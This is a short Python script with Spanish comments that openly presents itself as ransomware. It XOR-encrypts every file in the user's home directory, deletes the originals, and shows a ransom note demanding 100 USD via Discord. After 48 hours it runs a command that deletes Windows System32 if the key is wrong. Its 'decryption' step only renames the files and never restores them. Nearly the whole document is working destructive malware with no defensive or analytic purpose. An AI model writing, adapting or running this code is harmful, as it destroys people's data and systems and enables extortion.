import os
import time
import random
import sys
import ctypes

# ✔️ Configuración del ransomware
RANSOM_MESSAGE = """
💀🔥 RANSOMWARE ACTIVADO - 'HIMSELF' ON DISCORD 💀🔥
Tu sistema ha sido encriptado. ¡Paga 100 USD a #123456789 en Discord! 
Si no pagas en 48h, system32 será borrado. 🩸💻
"""
DECRYPT_KEY = "himself"

# ✔️ Encriptar archivos
def encrypt_files():
    print("Encriptando todos los archivos...")
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        for file in files:
            file_path = os.path.join(root, file)
            if os.path.isfile(file_path):
                try:
                    with open(file_path, "rb") as f:
                        content = f.read()
                    with open(file_path + ".encrypted", "wb") as f:
                        f.write(bytes([b ^ 0xA5 for b in content]))  # XOR simple
                    os.remove(file_path)  # Eliminar archivo original
                    print(f"Encriptado: {file_path}")
                except:
                    print(f"Error al encriptar: {file_path}")  

# ✔️ Prevenir cierre (loop infinito)
def keep_running():
    while True:
        try:
            time.sleep(1)
        except:
            pass

# ✔️ Interfaz Mr. Robot (simple console)
def show_interface():
    os.system("cls")  # Limpiar consola (Windows)
    print("💀🔥 RANSOMWARE - Mr. Robot ESTILO 💀")
    print(RANSOM_MESSAGE)
    print("Presiona Enter para introducir la llave de descifrado (HIMSELF):", end="")
    input()  # Esperar hasta que el usuario presione Enter

# ✔️ Main
if __name__ == "__main__":
    print("¡Ataque en curso! 💀")
    show_interface()
    encrypt_files()
    
    # ✔️ Esperar 48 horas
    print("Esperando 48 horas... (Puedes introducir 'himself' para descifrar)")
    time.sleep(48 * 3600)  # 48 horas
    
    # ✔️ Verificar llave de descifrado
    user_input = input("Introduce la llave de descifrado: ")
    if user_input == DECRYPT_KEY:
        print("Descifrado exitoso. Archivos restaurados. 🩸💻")
        os.system("attrib -h *.encrypted")  # Quitar atributos ocultos
        os.system("rename *.encrypted *.original")  # Renombrar archivos
        os.system("del ransomware.py")  # Eliminar el propio ransomware
        sys.exit()
    else:
        print("⏳ 48 horas transcurridas. Borramos system32...")
        os.system("del /F /Q C:\\Windows\\System32\\*.*")  # Eliminar todo de system32
        print("¡Sistema destruido! 💀💥")
        sys.exit()